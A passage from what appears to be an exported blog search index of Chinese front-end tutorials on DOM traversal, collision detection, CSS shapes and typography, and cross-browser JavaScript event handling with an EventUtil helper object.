ul.getElementsByTagName(&quot;li&quot;); for(var i = 0; i &lt; lis.length ; i++)&#123;//死循环，lis.length总是在动态的改变着 ul.appendChild(document.createElement(&quot;li&quot;)); &#125; 0x02 元素遍历childElementCount返回子元素的个数 firstElementChild返回第一个子元素 lastElementChild返回最后一个子元素 previousElementSibling返回前一个同辈元素 nextElementSibling返回后一个同辈元素]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[碰撞检测]]></title>
      <url>%2F2016%2F11%2F01%2F%E7%A2%B0%E6%92%9E%E6%A3%80%E6%B5%8B%2F</url>
      <content type="text"><![CDATA[0x00 圆形碰撞检测1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;圆形碰撞检测&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; div&#123; height: 50px; width: 50px; border:2px solid deeppink; background: yellowgreen; border-radius: 100%; position: absolute; &#125; #ballStatic&#123; position: absolute; top:200px; left: 400px; z-index:-1; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;ballMove&quot;&gt; &lt;/div&gt; &lt;div id=&quot;ballStatic&quot;&gt; &lt;/div&gt; &lt;script type=&quot;text/javascript&quot;&gt; var move = document.getElementById(&quot;ballMove&quot;); //移动的圆 var static = document.getElementById(&quot;ballStatic&quot;); //被碰撞的圆 move.onmousedown = function (event)&#123; var relatiMouseX = event.clientX - move.offsetLeft; //获得鼠标在移动圆中的相对 X 位置 var relatiMouseY = event.clientY - move.offsetTop; // 获得鼠标在移动圆中的相对 Y 位置 document.documentElement.onmousemove = function (event)&#123; var moveRicX = event.clientX - relatiMouseX + move.offsetWidth/2; //移动圆的圆心 X 坐标 var moveRicY = event.clientY - relatiMouseY + move.offsetHeight/2; // 移动圆的圆心 Y 坐标 var moveRadial = move.offsetHeight/2; // 移动圆的半径 var staticRadial = static.offsetWidth/2; // 被碰撞圆的半径 var staticRicX = static.offsetLeft + static.offsetWidth/2; //被碰撞圆的圆心 X 坐标 var staticRicY = static.offsetTop + static.offsetHeight/2; // 被碰撞的圆的圆心 Y 坐标 var centerX = moveRicX - staticRicX; var centerY = moveRicY -staticRicY; var addRadial = moveRadial + staticRadial; // 两圆相切的必要条件是圆心距小于它们的半径之和 if(centerX*centerX + centerY*centerY &lt;= addRadial*addRadial)&#123; static.style.background = &quot;red&quot;; &#125; else &#123; static.style.background = &quot;green&quot;; &#125; move.style.left = event.clientX - relatiMouseX + &quot;px&quot;; move.style.top = event.clientY - relatiMouseY + &quot;px&quot;; &#125; &#125; move.onmouseup = function ()&#123; document.documentElement.onmousemove = null; &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 0x01 矩形碰撞检测1234567891011for (var i = 0 ; i &lt; stop.length ; i++) &#123; if (X+move.offsetWidth&gt;=stop[i].offsetLeft&amp;&amp; X&lt;= stop[i].offsetLeft+stop[i].offsetWidth&amp;&amp;//处于被碰撞元素的 X 轴区域 Y+move.offsetHeight&gt;=stop[i].offsetTop&amp;&amp; Y&lt;=stop[i].offsetTop+stop[i].offsetHeight//处于被碰撞元素的 Y 轴区域 ) &#123; stop[i].style.background = &quot;yellow&quot; &#125;else&#123; stop[i].style.background = &quot;green&quot; &#125; &#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[字体排版]]></title>
      <url>%2F2016%2F10%2F24%2F%E5%AD%97%E4%BD%93%E6%8E%92%E7%89%88%2F</url>
      <content type="text"><![CDATA[0x01 连字符断行CSS3 添加了一新的属性,hyphens,它有三个值，nome,normal,auto。其作用是我们可以在任何时候手工插入软连字符，来实现断词折行的效果。只需要使用hyphens:auto就可以了。 0x02 插入换行下面将会使用自定义列表来做一个 Contact 模块。 12345678910111213141516171819202122232425262728293031323334353637383940//HTML &lt;div id=&quot;contact&quot;&gt; &lt;dl&gt; &lt;dt&gt;Name:&lt;/dt&gt; &lt;dd&gt;Jack&lt;/dd&gt; &lt;dt&gt;Email:&lt;/dt&gt; &lt;dd&gt;onejustone404@gmail.com&lt;/dd&gt; &lt;dd&gt;0nejust0one@gmail.com&lt;/dd&gt; &lt;dt&gt;Location:&lt;/dt&gt; &lt;dd&gt;BeiJing&lt;/dd&gt; &lt;/dl&gt;&lt;/div&gt;// CSSdt,dd &#123; display: inline; margin:0;&#125;dd &#123; margin: 0; font-weight: bold;&#125;dd+dt::before &#123; /*给每一个 dt 之前有 dd 的 dt 头部添加换行符*/ content: &apos;\A&apos;; /* \A 相当于换行符*/ white-space:pre; /*保留源代码中的空白符和换行符*/&#125;dd + dd:before &#123; /*在每个前面有 dd 的 dd 的头部插入逗号*/ content: &apos;,&apos;; margin-left: -0.25em; /*使用负 margin 去除多个连续的 dd 之间的空白符*/&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[形状]]></title>
      <url>%2F2016%2F10%2F24%2F%E5%BD%A2%E7%8A%B6%2F</url>
      <content type="text"><![CDATA[0x00 border-radiusborder-radius 有一个鲜为人知的属性，它可以单独指定水平和垂直半径，只要用斜杠(/) 分隔这两个值即可。此外，它不仅可以接受数值单位，还可以接受百分比值。而这个百分比会基于元素的尺寸进行解析。 所以，要创建一个自适应的椭圆，只需将两个方向(水平和垂直)的半径都设置为 50% 123456#box&#123; width:400px; height:200px; border-radius: 50% / 50%;&#125;// or 进一步简化border-radius: 50%; 大值特性和等比例特性此外，border-radius 还有两个特性:大值特性 和等比例特性 大值特性也就是值很大的时候，只会使用能够渲染的圆角大小渲染。大值特性相对于元素自身的 width ,height而言。 12345678910#box &#123;width: 200px;height: 200px;background: deeppink; border-radius: 50%; /*border-radius:100%*//*border-radius: 100px*//*border-radius:200px;*//*border-radius: 400px*/&#125; 如上，下面的渲染结果都是一样的，即最大渲染半径只能是 50%,100px; 等比例特性等比例特性:水平半径和垂直半径的比例是恒定不变的。等比例特性相对设置的 border-radius 参数的比例而言的 1234567#box &#123;width: 200px;height: 300px;background: deeppink; border-radius: 300px 0 0 0/300px 0 0 0;&#125; 元素占据宽度200像素，高度300像素。所以，根据大值特性，水平方向的300像素只能按照200像素半径渲染；再根据等比例特性，虽然垂直方向理论上的最大半径是300像素，但是受制于当初设定的300px300px的1:1比例，垂直方向最终渲染的半径大小也是200像素。于是，我们最后得到的只是一个200像素200像素的圆弧。 最后值得注意的是，border-radius 属性中前面的方位关键字和后面的半径方位是不匹配.它们的关系是:border-垂直-水平-radius: 水平 垂直 OK,了解上面的东西以后我们可以开始使用 border-radius 来实现许多形状了，比如： 半椭圆123456#box &#123; width: 200px; height: 300px; background: deeppink; border-radius: 50% / 100% 100% 0 0 ;&#125; 四分之一椭圆123456#box &#123; width: 200px; height: 300px; background: deeppink; border-radius: 100% 0 0 0;&#125; 0x01 平行四边形我们很容易想到对矩形使用 skew() 变形属性来达到我们想要的效果，但是，这样势必导致其元素中的内容也会跟着被拉伸，于是，我们想到使用伪元素。 123456789101112131415161718192021222324252627282930#box &#123; width: 100px; height: 40px; margin: 100px auto; margin-left:400px; text-align: center; line-height: 40px; /*其它文字，颜色，内边距等样式...*/ position: relative; /*设置宿主元素为相对定位*/&#125;#box:before &#123; /*使用伪元素来生成一个矩形*/ content: &apos;&apos;; position: absolute; /*设置伪元素为绝对定位*/ left:0; top:0; right:0; bottom: 0; /*设置伪元素所有偏移量为0，使其自动继承宿主元素尺寸*/ z-index: -1; /*将伪元素堆叠层次至于宿主元素之后*/ background: deeppink; transform:skewX(45deg); /*使用skewX()变形*/ border:1px solid red;&#125; 这技巧的关键在于，利用伪元素及其定位属性产生了一个方块，然后对伪元素设置样式，并将其放置在宿主元素的下层。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS事件(3)EventUtil对象]]></title>
      <url>%2F2016%2F10%2F20%2FJS%E4%BA%8B%E4%BB%B6(3)EventUntil%E5%AF%B9%E8%B1%A1%2F</url>
      <content type="text"><![CDATA[123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051var EventUtil = &#123; addHandler: function(element,type,handler)&#123; if(element.addEventListener)&#123; element.addEventListener(type, handler); &#125; else if (element.attachEvent)&#123; element.attachEvent(type, handler); &#125; else &#123; element[&quot;on&quot; + type] = handler; &#125; &#125;, getEvent: function(event)&#123; return event ? event : window.event; &#125;, getTarget: function(event)&#123; return event.target || event.srcElement; &#125;, preventDefault: function(event)&#123; if(event.preventDefault)&#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;, removeHandler: function()&#123; if (element.removeElementListener)&#123; element.removeElementListener(type,handler); &#125; else if (element.detachEvent)&#123; element.detachEvent; &#125; else &#123; element[&quot;on&quot; + type] = null; &#125; &#125;, stopPropagation: function()&#123; if(event.stopPropagation)&#123; event.stopPropagation(); &#125; else&#123; event.cancelBubble = true; &#125; &#125;, getWheelDelta:function(event)&#123; if(event.wheelDelta)&#123; return event.wheelDelta; &#125; else &#123; return -event.detail*40; &#125; &#125;,&#125;;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS事件(1)事件初见]]></title>
      <url>%2F2016%2F10%2F20%2FJS%E4%BA%8B%E4%BB%B6(1)%E4%BA%8B%E4%BB%B6%E5%88%9D%E8%A7%81%2F</url>
      <content type="text"><![CDATA[0x00 关于事件流建议先看 0x00 以后的部分 事件流描述的是从页面中接收事件的顺序。但是 IE 和 Nsetscape 开发团队却提出了差不多是相反的事件流的概念。 IE 的事件流是 事件冒泡流(Event Bubbling)，事件开始时由最具体的元素接收(即目标元素)，然后逐渐向上传播，&lt;docuement&gt; 对象。 1234567891011121314151617181920&lt;div id=&quot;parent&quot;&gt; 我是parent &lt;div id=&quot;child&quot;&gt; 我是child &lt;/div&gt; &lt;/div&gt;document.getElementById(&apos;child&apos;).onclick = function ()&#123; alert(&quot;我是child&quot;)&#125;document.querySelector(&apos;#parent&apos;).onclick = function()&#123; alert(&quot;我是parent&quot;)&#125;// 点击 div#child 弹出顺序是: //我是child//我是parent// 点击 div#parent// 只会弹出: 我是 parent 而 Netscape 的事件流是 事件捕获流(Event Capturing)。即在事件捕获过程中，document 对象首先接收到事件，然后事件沿 DOM 一次向下，一直到触发事件的目标对象。 对于 DOM0 级事件，事件处理程序会在事件冒泡阶段被处理。 DOM2 级事件流DOM2 级事件 规定事件流包括三个阶段: 事件捕获阶段，目标阶段和事件冒泡阶段。 在 DOM2 事件 中，实际的目标在捕获阶段不会接收到事件。但是在实际应用中，现代浏览器都会在捕获阶段触发事件对象上的事件。 如果要明确的指令事件应该在哪个阶段被触发，可以使用 DOM2 级事件提供的方法 addEventListener(&quot;eventType&quot;, callback, bool)，的第三个参数。当 bool 是 true 时，表示在捕获阶段调用事件处理程序。如果是 false ，表示在冒泡阶段调用事件处理程序。 0x01 事件处理程序事件是用户或者浏览器自身执行的某种动作。而响应某个事件的函数叫做事件处理程序。 DOM0 级事件处理程序DOM0 级事件处理是将一个函数赋值给一个事件处理程序属性来实现的。 每个元素(包括 window 和 document)都有自己的事件处理程序属性，这些属性通常小写，例如 onclick。 事件处理程序的名字以 on 开头。1234var btn = document.getElementById(&quot;myBtn&quot;);btn.onclick = function()&#123; alert(this.id)// &quot;myBtn&quot;&#125; 使用 DOM0 级方法指定的事件处理程序被认为是元素的方法。因此，这时的事件处理程序是在元素的作用域中运行。程序中的 this 指代的是当前元素。 DOM0 级对每个事件只支持一个事件处理程序。 DOM2 级事件处理程序DOM2 级中的两个方法: addEventListener() 添加事件处理程序 和 removeEventListener() 移除事件处理程序。 它们接收三个相同的参数:事件名，事件处理函数，一个布尔值。如果布尔值为 true，表示在捕获阶段调用事件处理程序，false 表示在冒泡阶段调用事件处理程序。 使用 DOM2 级事件处理程序的好处是可以添加多个事件处理程序。 12345678910&lt;script type=&quot;text/javascript&quot;&gt; var btn = document.querySelector(&quot;#myBtn&quot;); btn.addEventListener(&quot;click&quot;,function()&#123; alert(this.id); &#125;,false); btn.addEventListener(&quot;click&quot;,function()&#123; alert(&quot;word!&quot;); &#125;,false);&lt;/script&gt; btn 中的两个事件处理程序会按照添加它们的顺序先后执行，首先弹出 ID，然后显示 word. 使用 addEventListener( 添加的事件只能使用 removeEventListener() 来移除，并且与 addEventListener() 传入的参数相同，这个意味着无法移除使用 addEventListener() 添加的匿名函数。 IE 事件处理程序IE 中使用 attachEvent() 和 detachEvent() 来操作事件。两个方法接收两个相同的参数:事件处理程序名称与事件处理程序。 实际上，attachEvent 主要是为了兼容 IE8. 1234vat btn = document.querySelector(&quot;#myBtn&quot;);btn.attachEvent(&quot;onclick&quot;,function()&#123; alert(this === window); //true&#125;); attachEvent() 与 DOM0 级方法的区别在于事件处理程序的作用域。DOM0 级中，事件处理程序会在所属元素的作用域内运行。而使用 attachEvent() 方法，事件处理程序会在全局作用域中运行，因此 this 等于 window。 同样，attachEvent() 也可为同一元素添加不同事件，但是不同于 DOM0 级方法，IE 中的这些事件是以相反的顺序被触发的。 detachEvent() 方法同样不能移除匿名函数。 attachEvent() 方法添加的事件只会在冒泡阶段被处理。 夸浏览器的事件处理程序考虑到不同浏览器之间操作事件处理程序的差异，我们可以使用专门的库或者编写自己的兼容程序来处理不同的浏览器中的情况。 我们将创建一个 EventUtil 对象，并为其添加addHandler() 方法和 removeHandler() 方法。它的作用是视情况分别使用 DOM0 级方法，DOM2 级方法或 IE 方法来添加事件。 1234567891011121314151617181920212223var EventUtil = &#123; addHandler:function (element, type, handler)&#123; if (element.addEventListener)&#123;// 所有现代浏览器都可以使用的方法，IE9，firefox，chrome element.addEventListener(type, handler, false); &#125; else if(element.attachEvent)&#123; // 主要是为了兼容 IE8，IE8 是最后一个使用专用事件系统的主流浏览器。 element.attachEvent(&quot;on&quot;+type,handler) &#125;else&#123; element[&quot;on&quot; + type] = handler; &#125; &#125;, removeHandler:function (element,type,handler)&#123; if (element.removeEventListener)&#123; element.removeEventListener(type, handler,false) &#125; else if (element.detachEvent)&#123; element.detachEvent(type, handler) &#125; else &#123; element[&quot;on&quot; + type] = null; &#125; &#125;&#125;; 以上的两个方法首先会检测传入的元是否存在 DOM2 级方法，若存在就使用它。如果存在的是 IE 中的方法，则采取第二种方案。为了在 IE8 级更早的版本中运行，我们为事件类型添加了 on 前缀。 显然，我们没有考虑到所有的问题，比如在 IE 中的作用域问题，不过使用它们添加和删除事件处理程序还是足够了。 事件对象触发 DOM 上的事件时，会产生一个事件对象 event,它包含着所有与事件有关的信息。比如导致事件的元素，事件的类型以及与其它特定事件相关的信息。 DOM 的事件对象兼容 DOM 的浏览器会将一个 event 对象传入到事件处理程序中，而无论指定事件处理程序时使用的什么方法(DOM0 级或 DOM2 级),都会传入 event 对象。 event 对象包含与创建它的特定事件有关的属性和方法。触发的事件类型不一样，可用的属性和方法也不一样。DOM 中所有事件都具有以下成员: 属性/方法 类型 说明 bubbles 布尔 表明事件是否冒泡 cancelable 布尔 表明是否可以取消事件的默认行为 preventDefault 函数 取消事件的默认行为(cancelable 为则可以使用该方法) stopPropagation 函数 取消事件的进一步捕获或冒泡(bubbles为true则可以使用该方法) target 元素 事件的目标 type 字符串 被触发的事件的类型 在需要通过一个函数处理多个事件时，可以使用 type 属性。 123456789101112131415161718192021var btn = document.querySelector(&quot;#myBtn&quot;);var handler = function (event) &#123; // body... switch(event.type)&#123; case &quot;click&quot;: alert(&quot;Clicked&quot;); break; case &quot;mouseover&quot;: event.target.style.backgroundColor = &quot;red&quot;; break; case &quot;mouseout&quot;: event.target.style.backgroundColor = &quot;green&quot;; break; &#125;&#125;;btn.onclick = handler;btn.onmouseover = handler;btn.onmouseout = handler; 此外，我们可以使用 preventDefault() 方法来阻止特定事件的默认行为。 最后，还可以使用 stopPropagation() 方法来立即停止事件在 DOM 层次中的传播，即取消进一步事件的捕获或冒泡。 IE 中的事件对象不同于 DOM 中的 event 对象，要访问 IE 中的 event 对象，取决于事件处理程序的方法。在 IE 中使用 DOM0 级方法添加事件时， event 对象将会作为 window 对象的一个属性存在。若是使用 attachEvent() 方法添加事件，便会有一个 event 对象作为参数被传入事件处理程序函数中。如果是通过 HMTL 特性指定事件处理程序，那么还可以通过一个 event 的变量来访问 event 对象。 当然, IE 中的 event 也包含与创建它的事件相关的属性和方法，并且与 DOM 中的属性与方法类型。 属性/方法 类型 说明 cancelBubble 布尔 默认值为 false ，但将其设置为 true 便可取消事件冒泡(等价于 stopPropagation()) returnValue 布尔 默认为 true，将其设置为 false 可取消事件默认行为(等价于preventDefault()) srcElement 元素 事件的目标(等价于 target 属性) type 字符串 事件类型 夸浏览器的事件对象显然，DOM 标准和 IE 中的 event 对象不同，但是基于它们之间的相似性，我们依旧可以写出夸浏览器的方案。因为 IE 中event 对象的全部信息和方法 DOM 对象中都有，只不过实现方式不一样。 我们通过对 EventUtil 对象的增强来到达不同浏览器之间的兼容性问题。 123456789101112131415161718192021222324252627282930313233343536373839404142var EventUtil = &#123; addHandler: function(element,type,handler)&#123; if(element.addEventListener)&#123; element.addEventListener(type, handler); &#125; else if (element.attachEvent)&#123; element.attachEvent(type, handler); &#125; else &#123; element[&quot;on&quot; + type] = handler; &#125; &#125;, getEvent: function(event)&#123; return event ? event : window.event; &#125;, getTarget: function(event)&#123; return event.target || event.srcElement; &#125;, preventDefault: function(event)&#123; if(event.preventDefault)&#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;, removeHandler: function()&#123; if (element.removeElementListener)&#123; element.removeElementListener(type,handler); &#125; else if (element.detachEvent)&#123; element.detachEvent; &#125; else &#123; element[&quot;on&quot; + type] = null; &#125; &#125;, stopPropagation: function()&#123; if(event.stopPropagation)&#123; event.stopPropagation()； &#125; else&#123; event.cancelBubble = true; &#125; &#125;&#125;; 0x01 事件类型 UI 事件load在页面加载完成以后便会触发 onload 事件。有两种方法定义 onload 事件，一是使用 JS 为window 对象添加 load 类型的事件处理程序。二是为 &lt;body&gt; 元素添加 onload 特性。 unload从一个页面切换到另一页面时便会触发 unload 事件。利用这个事件最多的情况是清除引用，以次避免内存泄漏。 scrollscroll 事件是在 window 对象上发生的，但是其实际表示的是页面中相应元素的变化。 焦点事件焦点是事件会在页面失去焦点或得到焦点时触发。这类事件最主要的两个方法是 focus 和 blur。 鼠标事件DOM3 级中定义了 9 个鼠标事件： click：单击主鼠标按钮时触发 dblclick:双击主鼠标按钮时触犯 mousedown:按下任意鼠标按钮时触发 mouseup: 释放鼠标按钮时触发 mouseout: 鼠标划出时触发 mouseover: 鼠标滑过时触发 mousewheel: 鼠标滚轮事件 mouseenter: 仅IE9 ,FireFox9,, Opera支持 mouseleave: 仅IE9 ,FireFox9,, Opera支持 客户区的位置鼠标的位置信息保存在事件对象的 clientX 和 clientY 属性中。它们的值表示在事件发生时，鼠标指针在可视区域中的水平和垂直位置。 12345var section = document.querySelector(&quot;section&quot;);EventUtil.addHandler(section, &quot;click&quot;,function()&#123; event = EventUtil.getEvent(event); console.log(event.clientX + &quot;,&quot; + event.clientY);&#125;); 页面坐标位置我们可以通过 pageX 和 pageY 属性获得鼠标在页面中的位置。 12345var section = document.querySelector(&quot;section&quot;);EventUtil.addHandler(section, &quot;click&quot;,function()&#123; event = EventUtil.getEvent(event); console.log(event.pageX + &quot;,&quot; + event.pageY);&#125;); IE8 及其更早版本并不支持事件对象上的页面坐标。但是我们可以通过客户区坐标及其滚动坐标计算出来页面坐标。 12345var pageX = event.pageX, pageY = event.pageY;if(pageX == undefined) &#123; pageX = event.clientX + (document.body.scrolltop || document.documentElement.scrollTop); &#125;if(pageY == undefined) &#123; pageY = event.clientY + (document.body.scrollLeft || document.documentElement.scrollLeft);&#125; 屏幕坐标位置顾名思义，就是当事件发生时，鼠标相对于整个电脑屏幕的位置。我们可以通过 screenX 和 screenY 来获得它们的值。 onclick 鼠标点击事件点击按钮选中 checkbox checked属性值1234567891011121314151617181920212223242526272829303132&lt;body&gt; &lt;button id = &quot;selectAll&quot;&gt;Select All&lt;/button&gt; &lt;button id = &quot;cancelAll&quot;&gt;Cancel&lt;/button&gt; &lt;ul&gt; &lt;li&gt;&lt;input type=&quot;checkbox&quot; name = &quot;checkInput&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;input type=&quot;checkbox&quot; name = &quot;checkInput&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;input type=&quot;checkbox&quot; name = &quot;checkInput&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;input type=&quot;checkbox&quot; name = &quot;checkInput&quot;&gt;&lt;/li&gt; &lt;li&gt;&lt;input type=&quot;checkbox&quot; name = &quot;checkInput&quot;&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/body&gt;&lt;script type=&quot;text/javascript&quot;&gt; var btnSelectAll = document.getElementById(&quot;selectAll&quot;); var btnCancelAll = document.getElementById(&quot;cancelAll&quot;); var checkArray = document.getElementsByName(&quot;checkInput&quot;); btnSelectAll.onclick = function ()&#123; for(var i = 0; i &lt; checkArray.length; i++)&#123; checkArray[i].checked = true; &#125; &#125; btnCancelAll.onclick = function ()&#123; for(var i = 0; i &lt; checkArray.length; i++)&#123; checkArray[i].checked = false; &#125; &#125; &lt;/script&gt; 鼠标滑轮事件任何元素都可以触发 mousewheel 事件，只需将其指定给页面中的元素或者 document 对象，即可处理鼠标滚轮的交互操作。 与 mousewheel 事件对应的 evet 对象除了包含鼠标事件的所有标准信息外，还包含一个特殊的 wheelDelta 属性。当鼠标滚轮向前滑动时，wheelDelta 是120的倍数；当滚轮向后滑动时，wheelDelta 是 -120 的倍数。 而 FireFox 支持的是一个 DOMMouseScroll 的类似事件，而有关鼠标滚轮有关的信息则保存在 detail 属性中，当向前滑动鼠标滚轮时，该属性的值是 -3 的倍数，当向后滑动鼠标滚轮时，该属性值是 3 的倍数。 此外，Oprea 9.5 之前的版本中， wheelDelta 值的正负号是相反的。 取得鼠标滑轮增量(delta)兼容方法12345678var EventUtil = &#123; getWheelDelta:function()&#123; if(event.wheelDelta)&#123; return (client.engine.opera &amp;&amp; client.engine.opera &lt; 9.5 ? -event.wheelDelta : event.wheelDelta); &#125; else &#123; return -event.detail*40; &#125;,&#125;; 如此，便可以将相同的事件处理程序指定给 mousewheel 和 DOMMouseScroll 事件了。 键盘与文本事件 keydown: 按下键盘上的任意键时触发 keypress: 按下字符键时触发 keyup: 释放键盘上的键时触发 此外，另一个 textInput事件是对 keypress 事件的补充，旨在将文本显示给用户之前更容易拦截文本。 键码当发生 keydown 和 keyup 事件时，event 对象的 keyCode 属性会包含一个代码，与键盘上的一个特定的键对应。 DOM 和 IE 中的 event 对象都支持 keyCode 属性。 字符码当触发 keypress 事件时，绝大部分的浏览的 event 对象都会将该键对应的 ASCII 码保存在 charCode 属性中，而此时的 keyCode 属性的值可能为0或等于所按键的键码。 IE8 及之前版本和 Opera 则是在 keyCode 中保存字符的 ASCII 码。 在所有浏览器中按下能够插入和删除字符的键都会触发 keypress 事件。 以夸浏览器的方法取得字符编码12345678910var EventUtil = &#123; getCharCode: function () &#123; if (typeof event.charCode == &quot;number&quot;)&#123; return event.charCode; &#125; else &#123; return event.keyCode; &#125; &#125;,&#125;; 文本框事件inputchangefocusblur HTML5 事件contextmeun 事件通过单击鼠标右键，便可以调出上下文菜单。 contextmenu 事件是冒泡的，所以可以为 document 指定一个事件处理程序，以处理页面总的所有类似事件。 0x02 内存和性能 事件委托事件委托 利用了事件冒泡，只指定一个事件处理程序就可以管理某一类型的事件。它的主要作用便解决”事件处理程序过多”的问题。 使用事件委托，只需在 DOM 树中尽量最高的层次上添加一个事件处理程序。 1234567891011121314151617181920212223242526&lt;ul id=&quot;myLinks&quot;&gt; &lt;li id=&quot;doSomething&quot;&gt;Do something&lt;/li&gt; &lt;li id=&quot;goSomewhere&quot;&gt;Go somewhere&lt;/li&gt; &lt;li id=&quot;sayHi&quot;&gt;Say Hi&lt;/li&gt;&lt;/ul&gt; EventUtil.addHandler(myLinks,&quot;click&quot;,function(event)&#123; var event = EventUtil.getEvent(event); var target = EventUtil.getTarget(event); switch(target.id)&#123; case &quot;doSomething&quot;: console.log(target.id); document.title = &quot;I changed the document&apos;s title&quot;; break; case &quot;goSomewhere&quot;: console.log(target.id); location.href = &quot;http://www.baidu.com&quot;; break; case &quot;sayHi&quot;: alert(&quot;Say Hi&quot;); break; &#125;&#125;);]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS事件(2)mousewheel和scrollTop]]></title>
      <url>%2F2016%2F10%2F20%2FJS%E4%BA%8B%E4%BB%B6(2)mousewheel%E5%92%8CscrollTop%2F</url>
      <content type="text"><![CDATA[0x00 浏览器的渲染兼容模式全球的浏览器市场可谓三分天下，Chrome，FireFox，IE，而在各自的背后都追随着自己的若干小弟，它们各自都遵循这个共同渲染标准，同时也有用这属于自身的规范和特性。 我们可以通过document.compatMode 这个属性来检测浏览器的渲染模式，它 返回两个值，BackCompat(混杂模式，怪异模式) 和 CSS1Compat(标准模式)。 在BackCompat 模式下通过document.body 来获得页面的变化，而在CSS1Compat模式下document.docuementElement来获得页面变化。 12345678910EventUtil.addHandler(window, &quot;scroll&quot;, function(event)&#123; if(document.compatMode == &quot;CSS1Compat&quot;)&#123; // 如果是在标准模式下,那么通过 &lt;html&gt; 元素来获得页面变化 console.log(document.documentElement.scrollTop); &#125; else&#123; // 如果是在混杂模式下，那么通过 &lt;body&gt; 元素来获得页面变化 console.log(document.body.scrollTop); &#125;&#125;); 比较有意思的是，如果我们想获得可视区域的高度，那么对于 FireFox，通过 document.body.clientHeight 和 document.documentElement.clientHeight 都是可行的，但是对于 Chrome 则只能通过 document.documentElement.clientHeight 才行得通。 0x01 Chrome 添加全局 mousewhell方法一,通过给 document.documentElement 添加123456789document.documentElement.onmousewheel = function(event)&#123; event.preventDefault() if(event.wheelDelta &lt;0)&#123; document.body.scrollTop = 5400; console.log(document.body,scrollTop); &#125;else&#123; document.body.scrollTop = -5400; &#125;&#125; 方法二，通过给 window 添加 123456789window.onmousewheel = function()&#123; event.preventDefault() if(event.wheelDelta &lt;0)&#123; document.body.scrollTop = 5400; console.log(document.body.scrollTop); &#125;else&#123; document.body.scrollTop = -5400; &#125;&#125; 0x03 兼容FireFox和Chrome的 mousewheelScrollTop123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778var EventUtil = &#123; addHandler: function(element,type,handler)&#123; if(element.addEventListener)&#123; element.addEventListener(type, handler); &#125; else if (element.attachEvent)&#123; element.attachEvent(type, handler); &#125; else &#123; element[&quot;on&quot; + type] = handler; &#125; &#125;, getEvent: function(event)&#123; return event ? event : window.event; &#125;, getTarget: function(event)&#123; return event.target || event.srcElement; &#125;, preventDefault: function(event)&#123; if(event.preventDefault)&#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;, removeHandler: function()&#123; if (element.removeElementListener)&#123; element.removeElementListener(type,handler); &#125; else if (element.detachEvent)&#123; element.detachEvent; &#125; else &#123; element[&quot;on&quot; + type] = null; &#125; &#125;, stopPropagation: function()&#123; if(event.stopPropagation)&#123; event.stopPropagation(); &#125; else&#123; event.cancelBubble = true; &#125; &#125;, getWheelDelta:function(event)&#123; if(event.wheelDelta)&#123; return event.wheelDelta; &#125; else &#123; return -event.detail*40; &#125; &#125;,&#125;; function mousewheelScrollTop (event)&#123; var event = EventUtil.getEvent(event) EventUtil.preventDefault(event); var wheelDelta = EventUtil.getWheelDelta(event); console.log(wheelDelta); if(wheelDelta&lt;0)&#123; if(document.compatMode==&quot;CSS1Compat&quot;)&#123; // FireFox document.documentElement.scrollTop = 5000; &#125;else&#123; // Chrome document.body.scrollTop = 5000; &#125; &#125;else&#123; if(document.compatMode==&quot;CSS1Compat&quot;)&#123; document.documentElement.scrollTop = -5000; &#125;else&#123; document.body.scrollTop = -5000; &#125; &#125; &#125; EventUtil.addHandler(window,&quot;DOMMouseScroll&quot;,mousewheelScrollTop); EventUtil.addHandler(window,&quot;mousewheel&quot;,mousewheelScrollTop);]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[瀑布流]]></title>
      <url>%2F2016%2F10%2F20%2F%E7%80%91%E5%B8%83%E6%B5%81%2F</url>
      <content type="text"><![CDATA[0x00 瀑布流HTML 代码1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;瀑布流&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;pubuliu.css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;id id=&quot;weaper&quot;&gt; &lt;ul class=&quot;container&quot;&gt;&lt;li class=&quot;itemBox&quot;&gt;&lt;/li&gt;&lt;/ul&gt; &lt;ul class=&quot;container&quot;&gt;&lt;/ul&gt; &lt;ul class=&quot;container&quot;&gt;&lt;/ul&gt; &lt;ul class=&quot;container&quot;&gt;&lt;/ul&gt; &lt;/id&gt;&lt;/body&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;pubuliu.js&quot;&gt;&lt;/script&gt;&lt;/html&gt; CSS 代码12345678910111213141516171819202122232425262728293031*&#123; margin: 0; padding: 0; list-style:none; box-sizing: border-box;&#125;body&#123; background: red; max-width: 1200px; overflow-y: scroll; &#125;.container &#123; float: left; width: 22%; padding: 10px; border: 1px solid green; margin: 1%;&#125;.itemBox &#123; width: 100%; &#125;.itemBox img &#123; width: 100%;&#125; JS 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107var container = document.querySelectorAll(&quot;.container&quot;);console.log(container)var imageCount = [1];var EventUntil = &#123; 